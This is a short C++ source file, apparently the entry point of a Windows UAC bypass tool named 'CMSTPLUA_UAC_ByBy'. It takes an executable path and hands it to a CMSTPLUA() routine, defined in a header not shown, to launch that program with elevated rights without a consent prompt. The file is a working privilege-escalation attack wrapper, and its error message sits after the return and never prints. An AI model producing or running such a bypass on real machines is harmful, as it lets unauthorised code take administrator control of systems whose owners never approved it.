#include <iostream>
#include <format>
#include <ShlObj_core.h>
#include "cmstplua.h"

VOID Usage(VOID)
{
	std::cout << "usage: CMSTPLUA_UAC_ByBy.exe <FullPath_Of_Executable>\n";
}

INT __cdecl main(int argc, PCHAR argv[])
{
	if (argc < 2)
	{
		Usage();
		return EXIT_FAILURE;
	}

	if (IsUserAnAdmin())
	{
		std::cout << "[!] Running as Admin: WARNING\n";
	}

	PCCH Exec = argv[1];
	std::cout << "[+] ExecutableName=" << Exec << '\n';
	std::cout << "[+] Call cmstplua()\n";

	if (!CMSTPLUA(Exec))
	{
		return EXIT_FAILURE;
		std::cout << "[-] cmstplua() FAILED\n";
	}

	std::cout << "[+] Done !\n";
	return EXIT_SUCCESS;
}